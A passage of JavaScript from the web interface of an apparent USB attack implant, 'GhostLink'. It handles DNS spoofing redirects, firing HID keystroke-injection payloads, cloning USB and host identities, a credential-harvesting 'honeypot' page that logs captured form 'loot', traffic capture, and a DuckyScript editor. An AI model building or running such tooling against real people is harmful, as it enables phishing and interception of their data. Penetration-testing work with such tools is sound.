    } else {
      el.value = d[k] != null ? d[k] : '';
    }
  });
}

/* --- live-save: when a switch flips, save immediately. The LIVESAVE
   switch itself gates this feature. */
function bindLiveSave() {
  document.addEventListener('change', e => {
    const el = e.target;
    if (!el || !el.dataset || !el.dataset.k) return;
    if (el.type !== 'checkbox') return;              // only switches live-save
    const live = $('[data-k="LIVESAVE"]');
    if (live && !live.checked && el.dataset.k !== 'LIVESAVE') return;
    // Save without doing a full form re-collect — just overlay this one key
    // (keeps mid-edit text inputs intact).
    const re = new RegExp('^' + el.dataset.k + '=.*$', 'm');
    let txt = CFG_RAW || '';
    const line = el.dataset.k + '=' + (el.checked ? 'TRUE' : 'FALSE');
    txt = re.test(txt) ? txt.replace(re, line)
                       : (txt + (txt.endsWith('\n') ? '' : '\n') + line + '\n');
    CFG_RAW = txt; $('#cfg').value = txt;
    api('/api/config', { method:'POST', body: txt }).then(r => {
      if (r && r.ok) toast(`${el.dataset.k}=${el.checked ? 'TRUE' : 'FALSE'}`);
      else           toast('live-save failed', true);
    });
  });
}
function cfgCollect() {
  // start from CFG_RAW (preserves comments + unknown keys), overlay form fields
  let txt = CFG_RAW || '';
  const overrides = {};
  $$('[data-k]').forEach(el => {
    const k = el.dataset.k;
    overrides[k] = (el.type === 'checkbox')
      ? (el.checked ? 'TRUE' : 'FALSE')
      : el.value;
  });
  Object.keys(overrides).forEach(k => {
    const re = new RegExp('^' + k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=.*$', 'm');
    const line = k + '=' + overrides[k];
    if (re.test(txt)) txt = txt.replace(re, line);
    else              txt += (txt.endsWith('\n') ? '' : '\n') + line + '\n';
  });
  return txt;
}
async function cfgSave() {
  const txt = $('#cfgAdv') && $('#cfgAdv').checked ? $('#cfg').value : cfgCollect();
  CFG_RAW = txt;
  $('#cfg').value = txt;
  const r = await api('/api/config', { method:'POST', body: txt });
  if (r.ok) { toast('saved'); cfgReload(); }
  else      { toast('save failed', true); }
}
function cfgToggleAdvanced() {
  const on = $('#cfgAdv').checked;
  $('#cfgForm').style.display = on ? 'none' : 'block';
  $('#cfgRaw').style.display  = on ? 'block' : 'none';
  if (on) $('#cfg').value = cfgCollect();   // show the raw with current form values
  else    cfgReload();                       // re-sync form from the latest raw
}
// backwards-compat shims used by openTab + scriptSave + addSpoof
async function loadCfg() { await cfgReload(); }
async function saveCfg() { await cfgSave(); }
async function addSpoof() {
  const h  = $('#spoof-host').value.trim();
  const to = $('#spoof-to').value.trim();
  if (!h) { toast('give a hostname', true); return; }
  let txt = $('#cfg').value || await api('/api/config');
  if (/^REDIRECT=.*$/m.test(txt))  txt = txt.replace(/^REDIRECT=.*$/m, 'REDIRECT=TRUE');
  else                              txt += '\nREDIRECT=TRUE\n';
  if (/^REDIRECT_FROM=.*$/m.test(txt)) {
    txt = txt.replace(/^REDIRECT_FROM=.*$/m, m => {
      const [k, v] = m.split('=');
      const list = (v || '').split(/[,\s]+/).filter(Boolean);
      if (!list.includes(h)) list.push(h);
      return k + '=' + list.join(',');
    });
  } else { txt += `REDIRECT_FROM=${h}\n`; }
  if (to) {
    if (/^REDIRECT_TO=.*$/m.test(txt)) txt = txt.replace(/^REDIRECT_TO=.*$/m, `REDIRECT_TO=${to}`);
    else                                 txt += `REDIRECT_TO=${to}\n`;
  }
  $('#cfg').value = txt;
  $('#spoof-host').value = '';
  await api('/api/config', { method:'POST', body: txt });
  toast(`redirect added: ${h} → ${to || '172.32.0.93'}`);
}

/* --- hid ----------------------------------------------------- */
async function refreshPayloads() {
  const r = await fetch('/api/payloads');
  const files = await r.json();
  const ul = $('#payloads');
  if (!files.length) { ul.innerHTML = '<li class="dim">no payloads under /root/ghostlink/payloads</li>'; return; }
  ul.innerHTML = files.map(f => `<li onclick="firePayload('${f}')">${esc(f)}</li>`).join('');
}
async function firePayload(p) {
  const r = await api('/api/hid', { method:'POST', body: p });
  toast(r.ok ? 'fired ' + p : 'HID failed (ENABLE_HID=TRUE?)', !r.ok);
}
async function runHid() { firePayload($('#pl').value); }

/* --- system -------------------------------------------------- */
async function refreshSystem() {
  const [leases, log] = await Promise.all([api('/api/leases'), api('/api/log')]);
  const lb = $('#leases-body');
  if (!Array.isArray(leases) || !leases.length) {
    lb.innerHTML = '<tr><td colspan="5" class="dim">no leases</td></tr>';
  } else {
    lb.innerHTML = leases.map(l => `<tr>
      <td>${fmtTime(l.expires)}</td><td>${esc(l.mac)}</td>
      <td>${esc(l.ip)}</td><td>${esc(l.host || '-')}</td>
      <td class="dim">${esc(l.id || '-')}</td>
    </tr>`).join('');
  }
  $('#log').textContent = typeof log === 'string' ? log : '';
}

async function reboot() {
  if (!confirm('reboot?')) return;
  await api('/api/reboot', { method:'POST' });
}

/* --- clone identity -------------------------------------------------- */
async function idRefresh() {
  const r = await api('/api/clone/identity');
  if (typeof r === 'object' && r.identity) {
    const d = r.identity;
    $('#idVid').value  = d.VID  || '';
    $('#idPid').value  = d.PID  || '';
    $('#idMfr').value  = d.MFR  || '';
    $('#idProd').value = d.PROD || '';
    $('#idSer').value  = d.SER  || '';
  } else {
    ['#idVid','#idPid','#idMfr','#idProd','#idSer'].forEach(s => $(s).value = '');
  }
  const st = $('#idStatus');
  st.textContent = r.active
    ? `override active: VID=${r.identity.VID||'-'}, PID=${r.identity.PID||'-'}`
    : 'no override active — stock identity in use';
  st.style.color = r.active ? 'var(--primary)' : 'var(--text-muted)';
}
async function idSave(then_reboot) {
  const body = {
    VID:  $('#idVid').value.trim(),
    PID:  $('#idPid').value.trim(),
    MFR:  $('#idMfr').value.trim(),
    PROD: $('#idProd').value.trim(),
    SER:  $('#idSer').value.trim(),
  };
  const r = await api('/api/clone/identity', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(body),
  });
  if (r.ok) { toast('saved — takes effect on reboot'); idRefresh(); }
  else      { toast('save failed: ' + (r.err||''), true); }
  return !!r.ok;
}
async function idClear() {
  if (!confirm('remove identity override? (stock identity restored on next boot)')) return;
  const r = await api('/api/clone/identity', { method: 'DELETE' });
  if (r.ok) { toast('override cleared'); idRefresh(); }
  else      { toast('clear failed', true); }
}
async function idReboot() {
  if (!confirm('save + reboot now?')) return;
  if (!await idSave(true)) return;
  await api('/api/reboot', { method:'POST' });
}
function idPreset(v,p,m,prod,ser) {
  $('#idVid').value = v; $('#idPid').value = p;
  $('#idMfr').value = m; $('#idProd').value = prod; $('#idSer').value = ser;
}

async function hostsRefresh() {
  let hosts;
  try { hosts = await api('/api/clone/hosts'); } catch(e) { return; }
  const body = $('#hostsBody'); if (!body) return;
  if (!hosts || !hosts.length) {
    body.innerHTML = '<tr><td colspan="6" class="dim">no DHCP leases yet — plug in a host via USB</td></tr>';
    return;
  }
  body.innerHTML = hosts.map(h => {
    const os = h.os || {};
    const osLabel = os.guess === 'unknown' ? '-' : os.guess;
    const osTitle = (os.hints || []).join(' + ');
    const vMac = esc(h.mac || '');
    const vHn  = esc(h.hostname || '');
    return `<tr${h.active ? '' : ' class="dim"'}>
      <td>${esc(h.hostname || '(unknown)')}</td>
      <td>${esc(h.ip)}</td>
      <td><code>${vMac}</code></td>
      <td>${esc(h.vendor || '-')}</td>
      <td title="${esc(osTitle)}">${esc(osLabel)}</td>
      <td><button class="btn-ghost" onclick="cloneHost('${vMac}','${vHn}')">Clone</button></td>
    </tr>`;
  }).join('');
}

async function cloneHost(mac, hostname) {
  if (!confirm(`Clone identity from ${hostname || mac}?\nTakes effect on next reboot.`)) return;
  try {
    const r = await api('/api/clone/host_apply', {
      method: 'POST',
      body: JSON.stringify({mac, hostname}),
    });
    if (!r || !r.ok) { alert('clone failed: ' + ((r && r.err) || '?')); return; }
    const id = r.identity || {};
    toast(`Cloned: ${id.MFR} / ${id.PROD} (${id.VID}/${id.PID})`);
    idRefresh();
  } catch(e) { alert('clone failed: ' + e); }
}

async function netProbe() {
  const put = (id, val) => { const el = $('#'+id); if (el) el.textContent = val; };
  put('netInternet', '…'); put('netVia', '-'); put('netLatency', '-');
  let d; try { d = await api('/api/net/internet'); } catch(e) { d = {}; }
  put('netInternet', d.ok ? 'ONLINE' : 'offline');
  put('netVia',      d.via || '-');
  put('netLatency',  d.latency_ms != null ? d.latency_ms + ' ms' : '-');
  // compact link summary from refreshNetLink's data
  try {
    const link = await api('/api/net/link');
    const eth = (link.eth0 && link.eth0.carrier) ? 'eth0 UP' : 'eth0 down';
    const usb = (link.usb0 && link.usb0.carrier) ? 'usb0 UP' : 'usb0 down';
    put('netLinks', eth + ' · ' + usb);
  } catch(e) { put('netLinks', '-'); }
}

/* --- Honeypot ------------------------------------------------- */
async function hpReload() {
  let s;
  try { s = await api('/api/honeypot/status'); } catch(e) { return; }
  const en = $('#hpEnable');  if (en)   en.checked = !!s.enabled;
  const st = $('#hpState');   if (st) { st.textContent = s.enabled ? 'ON' : 'OFF';
                                        st.classList.toggle('on', !!s.enabled); }
  const a  = $('#hpAfter');   if (a)    a.value  = s.redirect_after || '';
  const r  = $('#hpRulesTxt');if (r)    r.value  = s.rules_text || '';
  // Honeypot URL banner — the dedicated IP, clickable, with bound-status.
  const ipIn = $('#hpIp');     if (ipIn) ipIn.value = s.ip || '';
  const link = $('#hpUrlLink');
  if (link) {
    if (s.ip) {
      link.textContent = s.url || ('http://' + s.ip + '/');
      link.href        = s.url || ('http://' + s.ip + '/');
    } else {
      link.textContent = '(no IP configured)'; link.href = '#';
    }
  }
  const note = $('#hpUrlNote');
  if (note) {
    if (!s.enabled) note.textContent = 'Honeypot is OFF — flip the switch to bind this IP on ' + (s.iface || 'usb0') + '.';
    else if (!s.ip_bound) note.textContent = 'Honeypot is ON but the IP is NOT bound on ' + (s.iface || 'usb0') + ' yet. Save IP to try again.';
    else note.textContent = 'Live on ' + (s.iface || 'usb0') + '. Any PC in the same /16 can hit it directly; trapped hosts resolve here via dnsmasq.';
  }
  $('#hpIpBound') && ($('#hpIpBound').textContent = s.ip_bound ? 'yes' : 'no');
  $('#hpLoot')   && ($('#hpLoot').textContent   = s.loot_count || 0);
  $('#hpCustom') && ($('#hpCustom').textContent = s.custom_html ? 'yes' : 'no');
  $('#hpRules')  && ($('#hpRules').textContent  = (s.rules_parsed || []).length);
  // trap-host count: unique redirect_from + WEBSITE_VISIT rules
  const trapHosts = new Set();
  (s.redirect_from || '').split(',').forEach(h => { h=h.trim(); if (h) trapHosts.add(h); });
  (s.rules_parsed || []).forEach(x => { if (x.host) trapHosts.add(x.host); });
  $('#hpHosts') && ($('#hpHosts').textContent = trapHosts.size);
  // Lazy-load the uploaded HTML into the textarea only on first open
  const h = $('#hpHtml');
  if (h && !h.dataset.loaded) {
    try {
      const r2 = await fetch('/api/honeypot/index', {credentials:'same-origin'});
      h.value = await r2.text(); h.dataset.loaded = '1';
    } catch(e) {}
  }
}

async function hpReloadLoot() {
  let data;
  try { data = await api('/api/honeypot/loot'); } catch(e) { return; }
  const body = $('#hpLootBody'); if (!body) return;
  if (!data || !data.length) {
    body.innerHTML = '<tr><td colspan="5" class="dim">no captures yet</td></tr>';
    return;
  }
  body.innerHTML = data.slice(0, 200).map(r => {
    const fields = Object.entries(r.data || {})
      .map(([k,v]) => `<code>${esc(k)}=${esc(String(v).slice(0,40))}</code>`)
      .join(' ');
    return `<tr class="match-row">
      <td>${esc(r.ts || '')}</td>
      <td>${esc(r.ip || '')}</td>
      <td>${esc(r.host || '')}</td>
      <td>${fields}</td>
      <td class="dim">${esc((r.ua || '').slice(0,60))}</td>
    </tr>`;
  }).join('');
}

async function hpSaveHtml() {
  const h = $('#hpHtml'); if (!h) return;
  try {
    const r = await fetch('/api/honeypot/index', {
      method:'POST', credentials:'same-origin',
      headers:{'Content-Type':'text/html'},
      body: h.value });
    const j = await r.json();
    if (j.ok) { toast && toast('Saved ' + j.size + ' bytes'); hpReload(); }
    else alert('Save failed: ' + (j.err||''));
  } catch(e) { alert('Save failed: ' + e); }
}

async function hpResetHtml() {
  // Clear uploaded file; webui will fall through to bundled default
  if (!confirm('Reset to bundled default page? (deletes your uploaded index.html)')) return;
  try {
    await fetch('/api/honeypot/index', {
      method:'POST', credentials:'same-origin',
      headers:{'Content-Type':'text/html'},
      body: '' });
    // Fetch default now
    const r = await fetch('/api/honeypot/index', {credentials:'same-origin'});
    const h = $('#hpHtml'); if (h) { h.value = await r.text(); h.dataset.loaded='1'; }
    hpReload();
  } catch(e) { alert('Reset failed: ' + e); }
}

function hpPreview() {
  const w = window.open('', '_blank');
  const html = ($('#hpHtml') && $('#hpHtml').value) || '';
  w.document.open(); w.document.write(html); w.document.close();
}

async function hpSaveIp() {
  const v = (($('#hpIp') && $('#hpIp').value) || '').trim();
  // Loose check — accept blank (= disable), else a dotted-quad.
  if (v && !/^(?:\d{1,3}\.){3}\d{1,3}$/.test(v)) {
    alert('Enter a dotted-quad IPv4 (e.g. 172.32.0.254) or leave blank.');
    return;
  }
  await cfgOverlaySet({ HONEYPOT_IP: v });
  toast('IP saved — rebinding…');
  setTimeout(hpReload, 500);
}

async function hpSaveBehavior() {
  // Write HONEYPOT_REDIRECT_AFTER and HONEYPOT_RULES back into config.txt
  // via overlay so unrelated keys are untouched.
  const after = ($('#hpAfter') && $('#hpAfter').value) || '';
  const rules = ($('#hpRulesTxt') && $('#hpRulesTxt').value) || '';
  await cfgOverlaySet({
    HONEYPOT_REDIRECT_AFTER: after,
    HONEYPOT_RULES:          rules.replace(/\r?\n/g, ';'),
  });
  hpReload();
}

async function hpClearLoot() {
  if (!confirm('Clear all captured loot?')) return;
  try { await fetch('/api/honeypot/loot_clear', {method:'POST', credentials:'same-origin'}); }
  catch(e) {}
  hpReloadLoot(); hpReload();
}

/* Overlay-write multiple keys into config.txt without clobbering other
   lines. Fetches current config, splices each K=V, posts back. */
async function cfgOverlaySet(kv) {
  let txt = '';
  try { const r = await fetch('/api/config', {credentials:'same-origin'}); txt = await r.text(); }
  catch(e) {}
  for (const [k, v] of Object.entries(kv)) {
    const line = k + '=' + v;
    const re = new RegExp('^' + k.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '=.*$', 'm');
    if (re.test(txt)) txt = txt.replace(re, line);
    else txt += (txt.endsWith('\n') ? '' : '\n') + line + '\n';
  }
  CFG_RAW = txt;
  const cfg = $('#cfg'); if (cfg) cfg.value = txt;
  await fetch('/api/config', {method:'POST', credentials:'same-origin',
                              headers:{'Content-Type':'text/plain'}, body: txt});
}

async function refreshNetLink() {
  // Fetches /api/net/link, paints the badges and enables / disables the
  // "Forwarded" segment based on eth0 carrier.
  let d;
  try { d = await api('/api/net/link'); } catch(e) { return; }
  if (!d || typeof d !== 'object') return;
  const eth = d.eth0 || {}, usb = d.usb0 || {};
  const paint = (el, cur) => {
    if (!el) return;
    el.classList.remove('up','down');
    if (cur.carrier) {
      el.classList.add('up');
      el.textContent = `${el.id === 'lnkUsb' ? 'usb0' : 'eth0'} ${cur.speed > 0 ? cur.speed + 'M ' : ''}UP`;
    } else {
      el.classList.add('down');
      el.textContent = `${el.id === 'lnkUsb' ? 'usb0' : 'eth0'} down`;
    }
  };
  paint($('#lnkUsb'), usb);
  paint($('#lnkEth'), eth);
  const mode = d.mode || 'PASSIVE';
  $('#modePassive').classList.toggle('active', mode === 'PASSIVE');
  $('#modeForward').classList.toggle('active', mode === 'FORWARD');
  // Forwarded only usable with a cable; keep the button, grey it out
  $('#modeForward').disabled = !eth.carrier;
  $('#modeHint').textContent = eth.carrier
    ? (mode === 'FORWARD'
        ? (d.forwarder_running
            ? 'Forwarder is running — eth0 <-> usb0 cross-copy active.'
            : 'Mode is FORWARD but the forwarder isn’t up yet (watcher polls every 2s).')
        : 'LAN cable detected on eth0 — click "Forwarded traffic" to start the forwarder.')
    : 'No LAN cable on eth0 — Forwarded mode is unavailable.';
}

async function setNetMode(mode) {
  const r = await api('/api/net/mode', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ mode }),
  });
  if (r.ok) { toast(mode); refreshNetLink(); }
  else      { toast('mode change failed: ' + (r.err||''), true); }
}

async function clearRecordsLive() {
  if (!confirm('wipe all records + verdicts? (safe while recording — files rotate afterwards)')) return;
  const r = await api('/api/clear', { method:'POST' });
  if (r.ok) { toast(`cleared ${r.removed} file${r.removed===1?'':'s'}`); refreshRecords(); tick(); }
  else      { toast('clear failed', true); }
}

async function toggleStream() {
  let txt = await api('/api/config');
  if (typeof txt !== 'string') return;
  const re = /^VERDICT_STREAM=.*$/m;
  const cur = (txt.match(re) || [''])[0];
  const next = cur.endsWith('TRUE') ? 'VERDICT_STREAM=FALSE' : 'VERDICT_STREAM=TRUE';
  txt = cur ? txt.replace(re, next) : (txt + '\n' + next + '\n');
  const r = await api('/api/config', { method:'POST', body: txt });
  if (r.ok) { toast(next.endsWith('TRUE') ? 'streaming' : 'streaming paused'); tick(); }
  else      { toast('toggle failed', true); }
}

async function toggleRecord() {
  // Flip RECORD_PCAP live. sniff.py mtime-watches config and will wipe/open
  // pcap files to match within ~1.5 s.
  let txt = await api('/api/config');
  if (typeof txt !== 'string') return;
  const re = /^RECORD_PCAP=.*$/m;
  const cur = (txt.match(re) || [''])[0];
  const next = cur.endsWith('TRUE') ? 'RECORD_PCAP=FALSE' : 'RECORD_PCAP=TRUE';
  txt = cur ? txt.replace(re, next) : (txt + '\n' + next + '\n');
  const r = await api('/api/config', { method:'POST', body: txt });
  if (r.ok) {
    toast(next.endsWith('TRUE') ? 'recording' : 'stopped');
    tick();
  } else {
    toast('toggle failed', true);
  }
}

async function applyStandard() {
  if (!confirm('Overwrite config.txt with the shipped defaults?\n\n'
             + 'This keeps the device password at root/ghostlink — change it after.'))
    return;
  const r = await api('/api/config/defaults', { method:'POST' });
  if (r.ok) { toast('defaults applied'); loadCfg(); tick(); }
  else      { toast('apply failed: ' + (r.err||''), true); }
}

async function cliReset() {
  const r = await api('/api/cli/reset', { method:'POST' });
  if (r.ok) {
    teardownXterm();
    await ensureXterm();
  }
}

/* --- toast --------------------------------------------------- */
function toast(msg, err) {
  const el = document.createElement('div');
  el.className = 'toast' + (err ? ' err' : '');
  el.textContent = msg;
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 2000);
}

/* --- boot ---------------------------------------------------- */
document.addEventListener('click', e => {
  const t = e.target.closest('.tablinks');
  if (t && t.dataset.tab) openTab(t.dataset.tab);
});
const TABS = ['Live','Records','Query','Config','Scripting','LiveType','Clone','Honeypot','Terminal','System'];
window.addEventListener('hashchange', () => {
  const h = location.hash.slice(1);
  if (TABS.includes(h)) openTab(h);
});

/* ============================================================
   DuckyScript IDE
   ============================================================ */
const DUCKY_KEYWORDS = [
  // commands
  {w:'REM',           kind:'cmd', hint:'comment'},
  {w:'REM_BLOCK',     kind:'cmd', hint:'start block comment'},
  {w:'END_REM',       kind:'cmd', hint:'end block comment'},
  {w:'STRING',        kind:'cmd', hint:'type a literal string'},
  {w:'DELAY',         kind:'cmd', hint:'wait N ms'},
  {w:'DEFAULTDELAY',  kind:'cmd', hint:'ms between every command'},
  {w:'DEFAULTCHARDELAY', kind:'cmd', hint:'ms between STRING chars'},
  {w:'REPEAT',        kind:'cmd', hint:'repeat previous line N times'},
  // GhostLink extensions
  {w:'GL_SET',          kind:'gl',  hint:'KEY=VALUE  — write config.txt'},
  {w:'GL_RELOAD_DNSMASQ', kind:'gl', hint:'kick dnsmasq to pick up new rules'},
  {w:'GL_RELOAD',       kind:'gl',  hint:'alias for GL_RELOAD_DNSMASQ'},
  {w:'GL_RUN',          kind:'gl',  hint:'name.sh — run a sibling payload'},
  {w:'GL_LOG',          kind:'gl',  hint:'append to ghostlink.log'},
  {w:'GL_WAIT',          kind:'gl', hint:'N seconds'},
  {w:'GL_SPOOF_ADD',    kind:'gl',  hint:'host — append to REDIRECT_FROM'},
  {w:'GL_REBOOT',       kind:'gl',  hint:'reboot the device'},
  {w:'WAIT_FOR_BUTTON_PRESS', kind:'cmd', hint:'block until on-board button pressed'},
  {w:'BUTTON_WAIT',     kind:'cmd', hint:'alias for WAIT_FOR_BUTTON_PRESS'},
  {w:'EXTENSION',       kind:'cmd', hint:'include an extension: EXTENSION name'},
  // modifiers
  {w:'GUI',    kind:'mod'}, {w:'WINDOWS', kind:'mod'}, {w:'WIN', kind:'mod'},
  {w:'SUPER',  kind:'mod'}, {w:'COMMAND', kind:'mod'}, {w:'CMD', kind:'mod'},
  {w:'CTRL',   kind:'mod'}, {w:'CONTROL', kind:'mod'},
  {w:'SHIFT',  kind:'mod'}, {w:'ALT',     kind:'mod'},
  // named keys
  {w:'ENTER',kind:'key'},{w:'RETURN',kind:'key'},{w:'ESC',kind:'key'},{w:'ESCAPE',kind:'key'},
  {w:'TAB',kind:'key'},{w:'SPACE',kind:'key'},{w:'BACKSPACE',kind:'key'},
  {w:'DELETE',kind:'key'},{w:'DEL',kind:'key'},{w:'INSERT',kind:'key'},
  {w:'UP',kind:'key'},{w:'UPARROW',kind:'key'},{w:'DOWN',kind:'key'},{w:'DOWNARROW',kind:'key'},
  {w:'LEFT',kind:'key'},{w:'LEFTARROW',kind:'key'},{w:'RIGHT',kind:'key'},{w:'RIGHTARROW',kind:'key'},
  {w:'HOME',kind:'key'},{w:'END',kind:'key'},{w:'PAGEUP',kind:'key'},{w:'PAGEDOWN',kind:'key'},
  {w:'CAPSLOCK',kind:'key'},{w:'NUMLOCK',kind:'key'},{w:'SCROLLLOCK',kind:'key'},
  {w:'PRINTSCREEN',kind:'key'},{w:'PAUSE',kind:'key'},{w:'BREAK',kind:'key'},
  {w:'MENU',kind:'key'},{w:'APP',kind:'key'},
];
for (let i = 1; i <= 12; i++) DUCKY_KEYWORDS.push({w:`F${i}`, kind:'key'});
const KW_SET = new Set(DUCKY_KEYWORDS.map(k => k.w));

let currentScript = null;        // name of script currently open

/* --- gutter + validation --- */
function updateGutter() {
  const ta = $('#scriptArea');
  const n = (ta.value.match(/\n/g) || []).length + 1;
  const lines = Array.from({length: n}, (_, i) => i + 1).join('\n');
  $('#editorGutter').textContent = lines;
  $('#editorLines').textContent = n + ' lines';
  validateScript();
}
function validateScript() {
  const text = $('#scriptArea').value;
  const errs = [];
  text.split('\n').forEach((raw, i) => {
    const s = raw.trim();
    if (!s) return;
    if (/^(REM|REM_BLOCK|END_REM|#)/i.test(s)) return;
    if (/^(STRING|DELAY|DEFAULTDELAY|DEFAULT_DELAY|DEFAULTCHARDELAY|REPEAT|WAIT) /i.test(s)) return;
    if (/^GL_/i.test(s)) return;              // GhostLink extensions
    if (/^EXTENSION\s+/i.test(s)) return;     // include reference
    if (/^(WAIT_FOR_BUTTON_PRESS|BUTTON_WAIT)\b/i.test(s)) return;
    const toks = s.split(/\s+/).map(t => t.toUpperCase());
    if (toks.every(t => KW_SET.has(t))) return;
    errs.push(`L${i+1}: unknown "${s.slice(0,40)}"`);
  });
  const el = $('#editorIssues');
  if (!errs.length) { el.textContent = 'no issues'; el.className = 'dim'; }
  else { el.textContent = errs.length + ' issue' + (errs.length>1?'s':'') + ': ' + errs[0]; el.className = 'err'; }
}

/* --- autocomplete popup --- */
function acClose() { $('#acPopup').style.display = 'none'; acItems = []; acIndex = 0; }
let acItems = []; let acIndex = 0; let acWordStart = 0;
function acOpen() {
  const ta = $('#scriptArea');
  const pos = ta.selectionStart;
  // extract current word (prefix before caret)
  const before = ta.value.slice(0, pos);
  const m = before.match(/[A-Za-z_][A-Za-z0-9_]*$/);
  if (!m) { acClose(); return; }
  const word = m[0].toUpperCase();
  acWordStart = pos - m[0].length;
  // Rank matches: prefix hits first (score 0), then substring hits (score 1).
  // Lets "ARROW" surface UPARROW/DOWNARROW/LEFTARROW/RIGHTARROW while still
  // showing "DELAY" first when the user types "DEL".
  const ranked = [];
  DUCKY_KEYWORDS.forEach(k => {
    const idx = k.w.indexOf(word);
    if (idx === 0)      ranked.push({ k, s: 0 });
    else if (idx > 0)   ranked.push({ k, s: 1 });
  });
  ranked.sort((a, b) => a.s - b.s || a.k.w.length - b.k.w.length);
  const matches = ranked.slice(0, 10).map(r => r.k);
  if (!matches.length || word.length < 1) { acClose(); return; }
  acItems = matches; acIndex = 0;
  const pop = $('#acPopup');
  pop.innerHTML = matches.map((k, i) =>
    `<div class="ac-item${i===0?' selected':''}" data-i="${i}">
       <span>${esc(k.w)}</span><span class="ac-kind">${esc(k.kind)}${k.hint?' · '+esc(k.hint):''}</span>
     </div>`).join('');
  // position near caret — rough estimate using line/col of caret
  const lineNo = (before.match(/\n/g) || []).length;
  const colNo  = before.length - before.lastIndexOf('\n') - 1;
  const taRect = ta.getBoundingClientRect();
  const wrapRect = $('#editorWrapper').getBoundingClientRect();
  pop.style.left = Math.min(taRect.width - 240, colNo * 7.6 + 48) + 'px';
  pop.style.top  = (lineNo * 20 + 36 - ta.scrollTop) + 'px';
  pop.style.display = 'block';
}
function acAccept(idx) {
  if (!acItems.length) return;
  const k = acItems[idx != null ? idx : acIndex].w;
  const ta = $('#scriptArea');
  const pos = ta.selectionStart;
  ta.value = ta.value.slice(0, acWordStart) + k + ta.value.slice(pos);
  const newCaret = acWordStart + k.length;
  ta.selectionStart = ta.selectionEnd = newCaret;
  acClose();
  updateGutter();
  ta.focus();
}

/* --- editor events --- */
function bindEditor() {
  const ta = $('#scriptArea');
  ta.addEventListener('input', () => { updateGutter(); acOpen(); });
  ta.addEventListener('scroll', () => { $('#editorGutter').scrollTop = ta.scrollTop; });
  ta.addEventListener('keydown', e => {
    const pop = $('#acPopup');
    const open = pop.style.display !== 'none';
    if (open) {
      if (e.key === 'ArrowDown') { e.preventDefault(); acIndex = Math.min(acItems.length-1, acIndex+1); refreshAcSel(); return; }
      if (e.key === 'ArrowUp')   { e.preventDefault(); acIndex = Math.max(0, acIndex-1); refreshAcSel(); return; }
      if (e.key === 'Tab' || e.key === 'Enter') { e.preventDefault(); acAccept(); return; }
      if (e.key === 'Escape') { e.preventDefault(); acClose(); return; }
    }
    if (e.ctrlKey && e.key === 's') { e.preventDefault(); scriptSave(); }
    if (e.ctrlKey && e.key === 'Enter') { e.preventDefault(); scriptRun(); }
  });
  $('#acPopup').addEventListener('click', e => {
    const it = e.target.closest('.ac-item');
    if (it) acAccept(parseInt(it.dataset.i, 10));
  });
  document.addEventListener('click', e => {
    if (!e.target.closest('.editor-wrapper')) acClose();
  });
}
function refreshAcSel() {
  $$('.ac-item').forEach((el, i) => el.classList.toggle('selected', i === acIndex));
}

/* --- scripts library --- */
async function scriptsRefresh() {
  const list = await api('/api/scripts');
  const ul = $('#scriptList');
  if (!Array.isArray(list) || !list.length) {
    ul.innerHTML = '<li class="dim">no scripts yet</li>';
    $('#scriptCount').textContent = '(0)';
    return;
  }
  $('#scriptCount').textContent = `(${list.length})`;
  ul.innerHTML = list.map(f =>
    `<li data-name="${esc(f.name)}" onclick="scriptOpen('${esc(f.name)}')"
         class="${currentScript === f.name ? 'active' : ''}">
       <span class="fl-del" onclick="event.stopPropagation(); scriptDelete('${esc(f.name)}')">✕</span>
       ${esc(f.name)}
       <span class="fl-size">${(f.size/1024).toFixed(1)}K</span>
     </li>`
  ).join('');
}
async function scriptOpen(name) {
  const t = await api('/api/scripts/' + encodeURIComponent(name));
  $('#scriptArea').value = typeof t === 'string' ? t : '';
  currentScript = name;
  currentExt = null;
  $('#editorTitle').textContent = name;
  $('#scriptStatus').textContent = 'opened ' + name;
  updateGutter();
  scriptsRefresh();
  extsRefresh();
}
async function scriptSave() {
  if (currentExt) {
    const r = await fetch('/api/extensions/' + encodeURIComponent(currentExt), {
      method:'POST', body: $('#scriptArea').value });
    if (r.ok) { toast('saved EXTENSION ' + currentExt); $('#scriptStatus').textContent = 'saved'; extsRefresh(); }
    else { toast('save failed', true); }
    return;
  }
  if (!currentScript) return scriptSaveAs();
  const r = await fetch('/api/scripts/' + encodeURIComponent(currentScript), {
    method:'POST', body: $('#scriptArea').value });
  if (r.ok) { toast('saved ' + currentScript); $('#scriptStatus').textContent = 'saved'; scriptsRefresh(); }
  else { toast('save failed', true); }
}
async function scriptSaveAs() {
  const name = prompt('save as (letters, digits, dash, dot, underscore; .ducky/.sh)', currentScript || 'new.ducky');
  if (!name) return;
  const r = await fetch('/api/scripts/' + encodeURIComponent(name), {
    method:'POST', body: $('#scriptArea').value });
  const j = await r.json();
  if (j.ok) { currentScript = name; $('#editorTitle').textContent = name; toast('saved ' + name); scriptsRefresh(); }
  else { toast('save failed: ' + (j.err || ''), true); }
}
async function scriptNew() { scriptsNew(); }
async function scriptsNew() {
  const name = ($('#newScriptName').value || 'new.ducky').trim();
  if (!/\.(ducky|txt|sh|dd)$/.test(name)) { toast('name must end in .ducky/.txt/.sh/.dd', true); return; }
  const r = await fetch('/api/scripts/' + encodeURIComponent(name), {
    method:'POST', body: 'REM new payload\nDELAY 500\n' });
  const j = await r.json();
  if (j.ok) {
    $('#newScriptName').value = '';
    scriptsRefresh();
    scriptOpen(name);
  } else { toast('create failed: ' + (j.err || ''), true); }
}
async function scriptDelete(name) {
  if (!confirm('delete ' + name + ' ?')) return;
  const r = await fetch('/api/scripts/' + encodeURIComponent(name), { method:'DELETE' });
  if (r.ok) {
    if (currentScript === name) {
      currentScript = null;
      $('#editorTitle').textContent = '(untitled)';
      $('#scriptArea').value = '';
      updateGutter();
    }
    scriptsRefresh();
  }
}
async function scriptRun() {
  const body = $('#scriptArea').value;
  if (!body.trim()) return toast('empty', true);
  if (currentScript) {
    // save then run named script (so what you see is what fires)
    await fetch('/api/scripts/' + encodeURIComponent(currentScript), {
      method:'POST', body });
    $('#scriptStatus').textContent = 'running ' + currentScript + '...';
    const r = await api('/api/scripts/' + encodeURIComponent(currentScript) + '/run', { method:'POST' });
